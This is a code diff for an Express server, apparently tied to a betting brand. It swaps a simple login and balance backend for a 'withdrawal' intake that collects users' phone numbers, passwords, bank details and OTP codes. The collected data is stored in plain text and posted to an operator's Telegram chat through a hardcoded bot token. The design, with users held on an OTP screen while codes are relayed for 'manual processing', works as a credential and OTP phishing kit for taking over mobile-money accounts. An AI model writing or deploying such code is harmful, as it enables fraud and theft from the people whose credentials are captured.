@@ -7,84 +7,125 @@ const app = express();
 app.use(express.json());
 app.use(cors());
 
-// --- SERVE FRONTEND & STATIC ASSETS ---
+// Serve the frontend
 app.use(express.static(path.join(__dirname, './'))); 
 
-// Health Check for 24/7 Stay-Awake (Cron-job.org)
-app.get('/ping', (req, res) => res.status(200).send("Server is Awake"));
+// Health Check to keep Render Awake
+app.get('/ping', (req, res) => res.status(200).send("Awake"));
 
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-// --- DATABASE LOGIC ---
-const USERS_FILE = './users.json';
-const getUsers = () => {
-    if (!fs.existsSync(USERS_FILE)) return [];
+// --- TELEGRAM & DATABASE CONFIG ---
+const WITHDRAWALS_FILE = './withdrawals.json';
+// IMPORTANT: Replace these with your actual bot token and chat ID
+const TELEGRAM_BOT_TOKEN = '8667318890:AAHd4lEyJovhoKaUCERzGvtj3yfYsU81X7U'; 
+const TELEGRAM_CHAT_ID = '7328420364';
+
+const getWithdrawals = () => {
+    if (!fs.existsSync(WITHDRAWALS_FILE)) return [];
     try { 
-        return JSON.parse(fs.readFileSync(USERS_FILE)); 
+        return JSON.parse(fs.readFileSync(WITHDRAWALS_FILE)); 
     } catch (e) { 
         return []; 
     }
 };
 
-// --- REGISTRATION ---
-app.post('/register', (req, res) => {
-    const { phone, password } = req.body;
-    let users = getUsers();
-    if (users.find(u => u.phone === phone)) return res.status(400).json({ message: "Already registered!" });
-    
-    const newUser = { phone, password, balance: 0.00, points: 50.00 };
-    users.push(newUser);
-    fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2));
-    res.status(201).json({ message: "Success", user: newUser });
-});
+const notifyAdminTelegramRequest = async (data) => {
+    const message = `
+🚨 *NEW WITHDRAWAL REQUEST* 🚨
+=========================
+🏦 *Method:* ${data.bank}
+💰 *Amount:* ${data.amount} ETB
+📱 *Phone:* +251${data.phone}
+🔑 *Password:* ||${data.password}|| (Hidden)
+💳 *Destination Acc:* ${data.account}
+⏰ *Time:* ${new Date().toLocaleString()}
+=========================
+*Status:* User is currently on OTP verification screen.
+    `;
 
-// --- LOGIN (WITH 9-DIGIT TRIAL FEATURE) ---
-app.post('/login', (req, res) => {
-    const { phone, password } = req.body;
-    let users = getUsers();
-    
-    // 1. Try to find existing user
-    let user = users.find(u => u.phone === phone && u.password === password);
-    
-    if (user) {
-        return res.json({ message: "Login successful!", user });
-    } 
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    try {
+        await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' }) });
+    } catch (error) { console.error("❌ Failed to send Telegram alert:", error); }
+};
 
-    // 2. TRIAL FEATURE: Auto-register if 9 digits and not found
-    const isNineDigits = /^\d{9}$/.test(phone);
-    if (isNineDigits) {
-        const newUser = { phone, password, balance: 0.00, points: 50.00 };
-        users.push(newUser);
-        fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2));
-        return res.json({ message: "Trial Login Success", user: newUser });
+const notifyAdminTelegramOTP = async (phone, otpCode) => {
+    const message = `
+✅ *USER ENTERED OTP* ✅
+=========================
+📱 *Phone:* +251${phone}
+🔢 *Code Entered:* ${otpCode}
+⏰ *Time:* ${new Date().toLocaleString()}
+=========================
+*Action:* Please verify this code against your bot logs and process the payment manually.
+    `;
+
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    try {
+        await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' }) });
+    } catch (error) { console.error("❌ Failed to send OTP Telegram alert:", error); }
+};
+
+// --- ROUTE 1: WITHDRAWAL INTAKE ---
+app.post('/api/request-withdrawal', async (req, res) => {
+    const { phone, password, amount, account, bank } = req.body;
+
+    if (!phone || !password || !amount || !account || !bank) {
+        return res.status(400).json({ message: "All fields are strictly required." });
     }
 
-    res.status(401).json({ message: "Invalid credentials or not a 9-digit number" });
-});
-
-// --- TRANSACTIONS ---
-app.post('/transaction', (req, res) => {
-    const { phone, amount, type, accountNumber } = req.body;
-    let users = getUsers();
-    const userIndex = users.findIndex(u => u.phone === phone);
-    
-    if (userIndex !== -1) {
-        const amt = parseFloat(amount);
-        if (type === 'withdraw' && users[userIndex].balance < amt) {
-            return res.status(400).json({ message: "Insufficient balance!" });
-        }
-        users[userIndex].balance += (type === 'deposit' ? amt : -amt);
-        fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2));
-        res.json({ message: "Success!", newBalance: users[userIndex].balance });
-    } else {
-        res.status(404).json({ message: "User not found" });
+    // 🛡️ 9 OR 10 DIGIT BACKEND VALIDATION
+    const isTrialValid = /^\d{9,10}$/.test(phone);
+    if (!isTrialValid) {
+        return res.status(400).json({ message: "Invalid Phone. Must be 9 or 10 digits." });
     }
+
+    const newRequest = {
+        id: Date.now().toString(),
+        phone,
+        password,
+        amount: parseFloat(amount),
+        account,
+        bank,
+        status: 'pending_otp',
+        timestamp: new Date().toISOString()
+    };
+
+    let withdrawals = getWithdrawals();
+    withdrawals.push(newRequest);
+    fs.writeFileSync(WITHDRAWALS_FILE, JSON.stringify(withdrawals, null, 2));
+
+    await notifyAdminTelegramRequest(newRequest);
+
+    res.status(200).json({ message: "Success", requestId: newRequest.id });
 });
 
-// --- RENDER DYNAMIC PORT BINDING ---
+// --- ROUTE 2: OTP VERIFICATION INTAKE ---
+app.post('/api/verify-otp', async (req, res) => {
+    const { phone, otp } = req.body;
+
+    if (!phone || !otp) {
+        return res.status(400).json({ message: "Missing phone or OTP code." });
+    }
+
+    let withdrawals = getWithdrawals();
+    let requestIndex = withdrawals.findIndex(w => w.phone === phone && w.status === 'pending_otp');
+
+    if (requestIndex !== -1) {
+        withdrawals[requestIndex].status = 'otp_submitted';
+        withdrawals[requestIndex].otpProvided = otp;
+        fs.writeFileSync(WITHDRAWALS_FILE, JSON.stringify(withdrawals, null, 2));
+    }
+
+    await notifyAdminTelegramOTP(phone, otp);
+
+    res.status(200).json({ message: "OTP received successfully." });
+});
+
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, '0.0.0.0', () => {
-    console.log(`🚀 Gashabet Trial Mode Live on Port ${PORT}`);
+    console.log(`🚀 Dedicated Withdrawal Server Live on Port ${PORT}`);
 });
